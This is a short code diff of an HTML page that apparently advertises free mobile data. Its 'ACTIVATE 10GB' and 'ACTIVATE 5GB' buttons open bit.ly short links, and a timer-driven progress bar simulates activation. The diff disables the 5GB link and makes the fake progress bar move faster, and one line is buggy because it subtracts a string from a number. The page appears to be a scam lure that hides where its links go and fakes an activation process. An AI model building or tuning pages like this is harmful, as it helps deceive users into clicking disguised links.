@@ -474,9 +474,9 @@ button:hover {
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ACTIVATE 10GB</font></button>
                     </a><br/>
         
-       <a  onclick="window.open('https://bit.ly/4bfJVOw')" href="https://bit.ly/4bfJVOw" >
+       <!--a  onclick="window.open('https://bit.ly/4bfJVOw')" href="https://bit.ly/4bfJVOw" >
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ACTIVATE 5GB</font></button>
-        </a>
+        </a-->
              <br/>
           
           
@@ -558,7 +558,7 @@ $("#go").click(function () {
         var i = 0;
        
         var interval = setInterval(function () {
-            i += 2;
+            i += 10;
             $("#percentage").text(i - "%");
             $("#fill").css("width", i + "%");
             if (i == 50) {
